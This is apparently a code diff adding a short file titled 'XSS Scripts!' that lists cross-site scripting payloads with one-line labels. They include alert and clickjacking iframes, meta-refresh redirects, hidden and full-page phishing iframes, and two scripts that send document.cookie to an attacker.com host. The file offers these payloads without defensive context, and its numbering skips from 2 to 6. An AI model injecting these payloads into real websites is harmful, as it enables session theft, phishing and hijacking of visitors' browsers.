@@ -1,0 +1,30 @@
+XSS Scripts!
+
+Alert: <img src=z onerror=alert("You_ARE_HACKED!")>
+
+Clickjacking (On Mouse Over): <iframe src="http://test.com" style="position:fixed;top:0;left:0;bottom:0;right:0;width:50%;height:50%;z-index:9999;background:transparent;" tabindex="-1" onmouseover="alert('Congratulations You just got tricked.!')"></iframe>
+
+Redirect to another website:
+<meta HTTP-EQUIV="REFRESH" content="0; url=http://test.com">
+
+Inject an iframe to redirect users to a phishing site:
+<iframe src="http://phishing-site.com" style="width:100%;height:100%;"></iframe>
+<iframe src="https://www.google.com/search?igu=1" style="width:100%;height:100%;"></iframe>
+
+Close all browser windows:
+<script>window.close();</script>
+************************************************
+Cookie stealing:
+<script>new Image().src='http://attacker.com?cookie='+document.cookie;</script>
+
+Show source code:
+<script>document.write('<pre>',document.getElementsByTagName('body')[0].outerHTML,'</pre>');</script>
+
+1. Display a popup with the URL of the current page:
+<script>alert([window.location.protocol,'//',window.location.hostname,window.location.pathname].join());</script>
+
+2. Create a hidden iframe and load a phishing website or a site containing a malicious payload:
+<iframe style="visibility:hidden;position:absolute;top:0;left:0;width:1px;height:1px;" src="http://malicious-site.com"></iframe>
+
+6. Inject malicious JavaScript code to steal data or perform unauthorized actions:
+<script>document.write('<img src="http://attacker.com?fakeParam='+location+'&realParam='+document.cookie+'" />');</script>
